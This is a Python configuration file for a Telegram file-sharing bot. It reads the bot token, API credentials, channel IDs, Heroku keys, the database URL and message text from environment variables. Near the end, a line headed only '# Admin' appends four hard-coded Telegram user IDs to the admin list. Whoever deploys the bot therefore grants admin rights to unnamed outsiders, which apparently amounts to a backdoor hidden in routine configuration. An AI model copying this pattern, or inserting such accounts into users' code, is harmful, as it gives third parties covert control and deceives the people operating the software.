# (©)Codexbotz

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

# Bot token from @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")

# API ID from my.telegram.org
APP_ID = int(os.environ.get("APP_ID", ""))

# API Hash from my.telegram.org
API_HASH = os.environ.get("API_HASH", "")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))

# OWNER ID
OWNER = os.environ.get("OWNER", "")

# Protect Content
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "False"))

# Heroku Credentials for updater.
HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

# Custom Repo for updater.
UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Elephant Sql Database
DB_URI = os.environ.get("DATABASE_URL", "")

# ForceSub Chnnel or group id
FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Start Message
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>⚡Hɪ ᴅᴜᴅᴇ.. {first}\n\nI ᴀᴍ ᴀ ꜰɪʟᴇ ꜱᴛᴏʀᴇ ʙᴏᴛ​\n​​Yᴏᴜ ᴄᴀɴ ᴀᴄᴄᴇꜱꜱ ꜰɪʟᴇꜱ ᴛʜʀᴏᴜɢʜ ᴀ ꜱᴘᴇᴄɪꜰɪᴄ ʟɪɴᴋ ᴘᴏᴡᴇʀᴇᴅ ʙʏ -​ @Anime_X_Hunter</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# ForceSub Message
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>🚀𝗦𝗼𝗿𝗿𝘆 𝗱𝘂𝗱𝗲 𝗷𝗼𝗶𝗻 𝗺𝘆 𝗰𝗵𝗮𝗻𝗻𝗲𝗹 𝗳𝗶𝗿𝘀𝘁 𝘁𝗼 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗶𝗹𝗲𝘀.. \n𝗔𝗳𝘁𝗲𝗿 𝗷𝗼𝗶𝗻 𝘁𝗿𝘆 𝗮𝗴𝗮𝗶𝗻..!</b>",
)

CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

# Admin
ADMINS.extend((844432220, 1250450587, 1750080384, 182990552))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
